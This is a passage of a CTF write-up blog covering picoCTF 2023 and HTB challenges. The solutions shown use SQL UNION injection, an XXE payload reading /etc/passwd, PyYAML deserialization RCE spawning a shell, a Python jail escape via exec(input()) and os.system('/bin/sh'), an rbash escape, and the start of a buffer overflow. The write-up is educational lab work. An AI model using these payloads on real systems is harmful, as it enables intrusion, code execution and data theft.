this field and it should work. After bypassing login, we see a table of information:\nThere\u0026rsquo;s no flag here, but one of the addresses seems to be a little interesting: \u0026ldquo;Maybe all the tables\u0026rdquo;. Doing our regular SQL injection 'or 1=1-- in the search bar results in the same information. It appears that although we are dumping all information from the current table, the flag is actually in a different table? In order to dump information in other tables we will look into UNION injections.\nFirst to explore union injections, we need to know the number of columns in this table. With this challenge, we can clearly see three tables, but just to be sure, we will check a UNION injection including 3 columns. If the column number doesn\u0026rsquo;t match the SQL query, the search will fail.\n1 Kampala\u0026#39; UNION SELECT NULL,NULL,NULL-- Note that choosing Kampala to search isn\u0026rsquo;t required, but it can make it easier to see our row of NULLs between it and the City/Address/Phone header.\nFrom here, we need to know which columns might be text injectable. Since city and address contain strings, these two are likely, however phone consists of numbers so possibly not the third column. Testing all 3 at once:\n1 Kampala\u0026#39; UNION SELECT \u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;,\u0026#34;abc\u0026#34;-- All three columns return our injected string, meaning we can dump information out of any of these three columns. Note you only need one column working to proceed with union injection, and also if you try injecting your string into a column that cannot take string values then the entire SQL query fails.\nProbing the SQL tables:\n1 Kampala\u0026#39; UNION SELECT sql,NULL,NULL from sqlite_master LIMIT 1,5; -- by pulling sql from sqlite_master, we can see a total of 4 tables:\nhints more_table offices users Normally users would be the most interesting for us, but our hint about \u0026ldquo;Maybe all the tables\u0026rdquo; is hinting towards the more_tables table first. We can check each table by using the same type of UNION injection. Note that this table list output also gives us the column names: id and flag. Another reason to try this table first.\n1 Kampala\u0026#39; UNION SELECT id,flag,NULL from more_table where 1=1-- And with that, we have our flag. picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}\nSOAP The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? Web Portal\nVisiting the page we 3 cards, each with an interactable Details button:\nWhen we watch Firefox\u0026rsquo;s Network Monitor and click a detail, we see a post method sent:\nThe request payload is in xml format, potentially leading to XXE (XML external entity) injection. We can try a simple payload described in portswigger\u0026rsquo;s post on the topic:\n1 `\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;/stockCheck\u0026gt;` modifying our own payload:\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY abc SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt;\u0026lt;data\u0026gt;\u0026lt;ID\u0026gt;\u0026amp;abc;\u0026lt;/ID\u0026gt;\u0026lt;/data\u0026gt; We can resend our request using Firefox\u0026rsquo;s Network Manager again, and replace the body contents with our newly modified payload. In the response tab, we see the contents of /etc/passwd as well as our flag:\npicoCTF{XML_3xtern@l_3nt1t1ty_55662c16}\nIn an interesting twist of annoyance, the xxe injection fails if you use the entity term \u0026lsquo;xxe\u0026rsquo;, as is done in portswigger\u0026rsquo;s example. After renaming the entity to \u0026lsquo;abc\u0026rsquo;, the xxe exploit worked effortlessly.\n","date":"2023-03-28T21:15:25-05:00","permalink":"https://yuwenmichael.netlify.app/post/picoctf_2023/","title":"PicoCTF_2023"},{"content":"Forensics Extraterrestrial Persistence There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Difficulty: very easy\nFor this challenge we are provided with a small persistence.sh script. Within the code, we see base64 encoded information being directed to a file service.service, then being called:\n1 2 3 echo -e \u0026#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==\u0026#34;|base64 --decode \u0026gt; /usr/lib/systemd/system/service.service systemctl enable service.service We can decode this base64 ourselves and have a better idea on what is being done\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ echo -e \u0026#34;W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==\u0026#34;|base64 --decode [Unit] Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c} After=network.target network-online.target [Service] Type=oneshot RemainAfterExit=yes ExecStart=/usr/local/bin/service ExecStop=/usr/local/bin/service [Install] WantedBy=multi-user.target Just like that, we find the flag: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nMisc Hijack The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship\u0026rsquo;s Thermal Control System. Can you take advantage of the situation without raising any suspicion? Difficulty: easy\nWe are given an IP address and port to nc into:\n1 nc 159.65.94.38 30109 Upon connection, we are greeted with a simple menu system:\n1 2 3 4 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit Trying to create a config, we see very few input checks in place:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt; 1 - Creating new config - Temperature units (F/C/K): A Propulsion Components Target Temperature : B Solar Array Target Temperature : C Infrared Spectrometers Target Temperature : D Auto Calibration (ON/OFF) : E Serialized config: ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K Uploading to ship... The returned serialized config looks to be base64 encoded, so let\u0026rsquo;s see what this contains:\n1 2 3 $ echo \u0026#34;ISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6IEQsIGF1dG9fY2FsaWJyYXRpb246IEUsIHByb3B1bHNpb25fdGVtcDogQiwKICBzb2xhcl9hcnJheV90ZW1wOiBDLCB1bml0czogQX0K\u0026#34; | base64 -d !!python/object:__main__.Config {IR_spectrometer_temp: D, auto_calibration: E, propulsion_temp: B, solar_array_temp: C, units: A} It looks like our config options that we created. However, loading this config fails even though creation was successful. A quick google search indicates that this !!python/object:__main__ syntax is from PyYAML. There is a page on hacktricks that details how one might go about exploiting this: https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization\nUnder RCE category, we see it might be possible to execute shell command with the right syntax. Testing the exploit:\n1 2 3 $ echo \u0026#39;!!python/object/apply:subprocess.Popen - ls\u0026#39; | base64 ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo= Loading base64 config:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; 2 Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBscwo= ** Success ** Uploading to ship... \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; chall.py flag.txt hijack.py ls is successfully executing! Now to read the flag.\nI had some trouble producing a payload that would simply cat the flag.txt file. Presumably, my payload setup was not suitable for a command with several words (cat flag.txt), so to work around this I simply spawned a shell:\n1 2 !!python/object/apply:subprocess.Popen - sh 1 2 $ cat payload | base64 ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo= 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; 2 Serialized config to load: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzaAo= ** Success ** Uploading to ship... \u0026lt;------[TCS]------\u0026gt; [1] Create config [2] Load config [3] Exit \u0026gt; cat flag.txt HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?} HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}\nJanken As you approach an ancient tomb, you\u0026rsquo;re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there\u0026rsquo;s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you\u0026rsquo;ll be denied entry. Difficulty: easy\nIn this challenge we are given a compiled binary called janken. Upon running it, we can view the rules for the game:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ ./janken ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▌ じ ゃ ん 拳 ▐ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ 1. ℙ ∟ ₳ Ұ 2. ℜ ℧ ∟ Ӗ ⅀ \u0026gt;\u0026gt; 2 ▛▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▜ ▚ [*] Rock is called \u0026#34;Guu\u0026#34; (ぐう). ▞ ▞ [*] Scissors is called \u0026#34;Choki\u0026#34; (ちょき). ▚ ▚ [*] Paper is called \u0026#34;Paa\u0026#34; (ぱあ). ▞ ▞ ▚ ▚ 1. Rock \u0026gt; scissors, scissors \u0026gt; paper, paper \u0026gt; rock. ▞ ▞ 2. You have to win [100] times in a row in order to get the prize. 🏆 ▚ ▙▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▟ To win, we must win 100 games of rock paper scissors in a row. If left up to chance, this is not realistic. There must be a way to force a win. I recall seeing this same problem presented in another CTF competition, picoCTF 2022. (RPS in Binary Exploitation category). In that challenge, the win condition was only checking if the player\u0026rsquo;s input contained the winning string. So, by playing all 3 options at once you were guaranteed to win. We can try that here as well:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026gt;\u0026gt; 1 [!] Let the game begin! 🎉 [*] Round [1]: Choose: Rock 👊 Scissors ✂ Paper 📜 \u0026gt;\u0026gt; rock,paper,scissors [!] Guru\u0026#39;s choice: scissors [!] Your choice: rock,paper,scissors [+] You won this round! Congrats! [*] Round [2]: The syntax was a little picky, but we see a guaranteed winning combination with rock,paper,scissors.\nWriting out rock,paper,scissors 100 times in a row is boring and tedious, so I channeled my inner programmer and spent twice as long making a script that will do it for me:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * p = remote(\u0026#39;178.62.64.13\u0026#39;, 31174) win = \u0026#39;rock,paper,scissors\u0026#39; #Start game 1 and chain p.sendline(\u0026#39;1\u0026#39;) #Looping sendline is too fast, so I wait for interactive marker \u0026gt;\u0026gt; for i in range(100): p.sendlineafter(\u0026#39;\u0026gt;\u0026gt;\u0026#39;,win) response = p.recvallS() print(response) Now to acquire the flag in extra speedy fashion:\n1 2 3 4 5 6 7 8 9 10 $ python RPS.py [+] Opening connection to 178.62.64.13 on port 31174: Done [+] Receiving all data: Done (223B) [*] Closed connection to 178.62.64.13 port 31174 [!] Guru\u0026#39;s choice: rock [!] Your choice: rock,paper,scissors [+] You won this round! Congrats! [+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG} HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}\nNehebkaus Trap In search of the ancient relic, you go looking for the Pharaoh\u0026rsquo;s tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest? Difficulty: medium\nConnecting to the nc link, we find that it\u0026rsquo;s a trap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 nc 104.248.169.117 32684 __ {00} \\__/ /^/ ( ( \\_\\_____ (_______) (_________()Ooo. [ Nehebkau\u0026#39;s Trap ] You are trapped! Can you escape? \u0026gt; Various shell commands do not work, and we quickly find that several critical inputs are blacklisted, such as single and double quotes, or dots. The snake is our first subtle hint, we are likely trapped in a python jail! There is a posting on hacktricks that covers this type of problem. Unfortunately, most of the suggestions will not work for us with restrictions on dot, quotes, space and even uderscores. We can, however, print the globals and locals:\n1 2 3 4 5 6 7 8 9 10 11 \u0026gt; print(globals()) [*] Input accepted! {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x7f37eeb47c10\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;/home/ctf/./jail.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;time\u0026#39;: \u0026lt;module \u0026#39;time\u0026#39; (built-in)\u0026gt;, \u0026#39;BLACKLIST\u0026#39;: (\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39; \u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;,\u0026#39;), \u0026#39;Color\u0026#39;: \u0026lt;class \u0026#39;__main__.Color\u0026#39;\u0026gt;, \u0026#39;_print\u0026#39;: \u0026lt;function _print at 0x7f37eeba3d90\u0026gt;, \u0026#39;banner\u0026#39;: \u0026lt;function banner at 0x7f37eeae2c20\u0026gt;, \u0026#39;loop\u0026#39;: \u0026lt;function loop at 0x7f37eeae2cb0\u0026gt;, \u0026#39;_\u0026#39;: 2} \u0026gt; print(locals()) [*] Input accepted! {\u0026#39;banned\u0026#39;: [], \u0026#39;inp\u0026#39;: \u0026#39;print(locals())\u0026#39;} If it wasn\u0026rsquo;t found through trial and error yet, we can see the full list of blacklisted characters here:\n1 BLACKLIST\u0026#39;: (\u0026#39;.\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39; \u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;,\u0026#39;) Under globals we find builtins is present. We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found here. Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:\n1 2 3 4 5 \u0026gt; a=input() [*] Input accepted! Error: invalid syntax (\u0026lt;string\u0026gt;, line 1) Unfortunately, I received an error before being able to input anything for variable declaration. However, trying input() on its own seems to work as I expected:\n1 2 3 4 5 6 \u0026gt; input() [*] Input accepted! \u0026#39;\u0026#34;\u0026#39;\u0026#34;Test aWE$% \u0026gt; Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way? Next I tried input in combination with exec:\n1 2 3 4 5 6 7 \u0026gt; exec(input()) [*] Input accepted! print(\u0026#34;This is a test.\u0026#34;) This is a test. \u0026gt; The print worked, and again no notice on blacklisted functions. From here there are several ways to read a flag. Since I wasn\u0026rsquo;t sure what the flag was named or where it might be, I decided to create a shell session using a gtfobins payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026gt; exec(input()) [*] Input accepted! import os; os.system(\u0026#34;/bin/sh\u0026#34;) whoami ctf ls flag.txt jail.py cat flag.txt HTB{y0u_d3f34t3d_th3_sn4k3_g0d!} HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}\nPersistence Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it\u0026rsquo;s broken and usually returns random data, but keep trying, and you might get lucky\u0026hellip; Legends say it works once every 1000 tries. Difficulty: very easy\nThe objective for this problem is very straightforward: send a /GET request to IP:PORT/flag and you will receive the flag after ~1000 attempts. 1000 attempts is a rather high number to reach manually, so creating a loop for curl is the way to go:\n1 2 3 4 5 #!/bin/bash for i in {1..1000} do curl -s 165.232.100.46:31980/flag done -s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you\u0026rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen. Running the script:\n1 2 $ chmod +x loop.sh $ ./loop.sh | grep \u0026#34;HTB\u0026#34; grep allows us to filter any uninteresting output and only shows our flag. Eventually, we see the results pop out at us.\n1 HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW\u0026amp;z3]X8CLb5Q7kR The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag. Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always. HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nRestricted You \u0026rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment? Difficulty: easy\nBy exploring the provided sshd_config file, we can see for the user restricted we are permitted empty passwords. And so, our entry into the system is through ssh as the user restricted:\n1 2 3 4 5 6 7 8 9 10 11 $ ssh restricted@167.99.86.8 -p 32608 Linux ng-restricted-rtgbl-c6f644c76-t5z7n 5.18.0-0.deb11.4-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Mar 23 23:40:20 2023 from 167.99.86.8 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ Upon entry, we can check a few commands and see extremely limited options. We are unable to do traditional navigation commands such as ls or cd. However, we do have access to other powerful bash builtins such as echo and read. We can use echo to browse directories in a similar manner to ls:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo .* . .. .bash_history .bash_logout .bash_profile .bashrc .bin .profile In our current directory, there is nothing that looks like a flag. Checking elsewhere:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo /* /bin /boot /dev /etc /flag_8dpsy /home /lib /lib64 /media /memories.dump /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var flag_8dpsy looks like a potential candidate. To view, we can leverage echo and read together:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ read IFR \u0026lt; /flag_8dpsy; echo $IFR HTB{r35tr1ct10n5_4r3_p0w3r1355} Alternative Method, selecting bash as ssh terminal.\nUser restricted has its default terminal set to rbash, the restricted terminal we previously worked in. However, we can just as easily pick our own terminal agent at ssh launch:\n1 2 3 4 5 $ ssh restricted@167.99.86.8 -p 32608 -t bash restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ whoami restricted restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ cat /flag_8dpsy HTB{r35tr1ct10n5_4r3_p0w3r1355} HTB{r35tr1ct10n5_4r3_p0w3r1355}\nPwn Labyrinth You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences. Difficulty: easy\nWe are given a labyrinth executable:\n1 2 3 4 5 6 $ file labyrinth labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped $ checksec --file=labyrinth RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO No canary found NX enabled No PIE No RPATH RW-RUNPATH 83 Symbols No 0 4labyrinth We see this is a non stripped ELF 64-bit binary, and checksec reveals no canary and no PIE.\nRunning labyrinth, from the very start, we are given a choice between 100 options:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; 1 [-] YOU FAILED TO ESCAPE! An incorrect answer exits the program. We can try to go through this manually, but we can also find the answer in the file itself:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ cat labyrinth \u0026lt;..SNIP..\u0026gt; ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 00%d Door: 0%d Door: %d \u0026gt;\u0026gt; 69069 You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; \u0026lt;..SNIP..\u0026gt; We can see 69069, likely accepting valid answers for both 69 and 069.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; 69 You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; 69 [-] YOU FAILED TO ESCAPE! We progressed one stage, but we are still stuck. Is this second input expecting a number, or something else?\n1 2 3 4 5 6 7 8 9 Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [-] YOU FAILED TO ESCAPE! zsh: segmentation fault ./labyrinth We reached a segmentation fault, so this might be a target for buffer overflow.\nUsing Radare2 to find win address:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 r2 labyrinth -- º|\u0026lt;|\u0026lt;| -( glu glu glu, im the r2 fish ) [0x00401140]\u0026gt; aaaa INFO: Analyze all flags starting with sym. and entry0 (aa) INFO: Analyze all functions arguments/locals (afva@@@F) INFO: Analyze function calls (aac) INFO: Analyze len bytes of instructions for references (aar) INFO: Finding and parsing C++ vtables (avrr) INFO: Type matching analysis for all functions (aaft) INFO: Propagate noreturn information (aanr) INFO: Scanning for strings constructed in code (/azs) INFO: Finding function preludes (aap) INFO: Enable anal.types.constraint for experimental type propagation [0x00401140]\u0026gt; afl 0x00401140 1 42 entry0 0x00401180 4 31 sym.deregister_tm_clones 0x004011b0 4 49 sym.register_tm_clones 0x004011f0 3 28 sym.__do_global_dtors_aux 0x00401220 1 2 sym.frame_dummy 0x00401670 1 1 sym.__libc_csu_fini 0x00401255 5 208 sym.escape_plan 0x00401030 1 6 sym.imp.putchar 0x00401130 1 6 sym.imp.fwrite 0x004010c0 1 6 sym.imp.fprintf 0x004010f0 1 6 sym.imp.open 0x00401100 1 6 sym.imp.perror 0x00401120 1 6 sym.imp.exit 0x00401090 1 6 sym.imp.fputc 0x004010a0 1 6 sym.imp.read 0x00401080 1 6 sym.imp.close 0x00401674 1 9 sym._fini 0x0040137b 1 51 sym.banner 0x00401050 1 6 sym.imp.puts 0x00401610 4 93 sym.__libc_csu_init 0x00401222 1 51 sym.cls 0x00401060 1 6 sym.imp.printf 0x00401170 1 1 sym._dl_relocate_static_pie 0x00401405 15 510 main 0x00401325 1 86 sym.read_num 0x00401110 1 6 sym.imp.strtoul 0x00401000 3 23 sym._init 0x004013ae 1 87 sym.setup 0x004010e0 1 6 sym.imp.setvbuf 0x00401070 1 6 sym.imp.alarm 0x00401040 1 6 sym.imp.strncmp 0x004010b0 1 6 sym.imp.fgets 0x004010d0 1 6 sym.imp.malloc sym.escape_plan looks interesting by name, and the size also suggests there might be a few things going on.\n1 2 3 4 5 6 7 8 9 10 